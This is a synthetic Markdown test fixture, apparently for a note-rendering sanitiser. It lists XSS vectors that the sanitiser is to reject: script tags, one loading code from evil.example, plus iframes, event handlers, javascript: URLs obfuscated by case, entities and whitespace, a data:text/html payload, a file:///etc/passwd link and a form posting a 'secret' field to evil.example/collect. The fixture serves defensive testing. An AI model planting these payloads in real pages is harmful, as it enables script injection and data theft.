# Hostile Input

Synthetic fixture of constructs requirements section 15.2 rejects or downgrades.
Every payload is inert by construction; none of it comes from the private vault.

## Raw script and embeds

<script>window.alert(1)</script>

<script src="https://evil.example/x.js"></script>

<iframe src="https://evil.example/">iframe fallback text</iframe>

<object data="https://evil.example/x.swf">object fallback text</object>

<embed src="https://evil.example/x.swf">

<svg><script>window.alert(2)</script><text>svg text</text></svg>

<math><mtext>math text</mtext></math>

<template><img src="x" onerror="window.alert(3)"></template>

<noscript><img src="y" onerror="window.alert(4)"></noscript>

<style>body { display: none }</style>

<base href="https://evil.example/">

<link rel="stylesheet" href="https://evil.example/x.css">

<meta http-equiv="refresh" content="0;url=https://evil.example/">

## Event handlers and inline style

<div onclick="window.alert(5)" onmouseover="window.alert(6)">handler div</div>

<p ONCLICK="window.alert(7)">uppercase handler</p>

<div style="position:fixed;top:0;left:0;width:100vw">style div</div>

<img src="broken.png" onerror="window.alert(8)" alt="with handler">

## Dangerous URL schemes

[plain](javascript:window.alert(9))

[cased](JaVaScRiPt:window.alert(10))

[entity decimal](&#106;avascript:window.alert(11))

[entity hex](&#x6a;avascript:window.alert(12))

[entity colon](javascript&colon;window.alert(13))

[tab split](java	script:window.alert(14))

[leading space]( javascript:window.alert(15))

[vbscript](vbscript:msgbox(16))

[data html](data:text/html,<script>window.alert(17)</script>)

[protocol relative](//evil.example/path)

[file url](file:///etc/passwd)

<a href="javascript:window.alert(18)">raw anchor</a>

<img src="javascript:window.alert(19)" alt="scheme in src">

## Forms and controls

<form action="https://evil.example/collect" method="post">
<input type="text" name="secret" value="x">
<input type="hidden" name="h" value="y">
<button type="submit">Send</button>
</form>

<textarea>textarea content</textarea>

<select><option>option text</option></select>

## Unsupported plugin syntax

```dataview
LIST FROM #private
```

```dataviewjs
dv.pages("#private").forEach(p => dv.paragraph(p.file.name))
```

```tasks
not done
path includes private
```
